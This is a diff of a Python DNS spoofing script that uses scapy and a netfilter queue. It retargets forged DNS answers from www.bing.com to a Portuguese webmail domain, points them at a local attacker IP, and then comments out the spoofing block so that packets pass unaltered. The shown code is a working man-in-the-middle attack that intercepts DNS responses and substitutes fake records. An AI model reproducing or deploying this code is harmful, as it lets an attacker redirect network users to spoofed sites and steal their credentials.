@@ -28,12 +28,14 @@ print(s_iptable)
 
 
 def process_packet(packet):
+    
+    '''
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.portugalmail.pt" in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.104")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.109")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -43,8 +45,9 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].chksum
 
             packet.set_payload(str(scapy_packet))
-
+    '''
     packet.accept()
+    
 
 
 # use function NetFilterQueue to execute a function in information recive
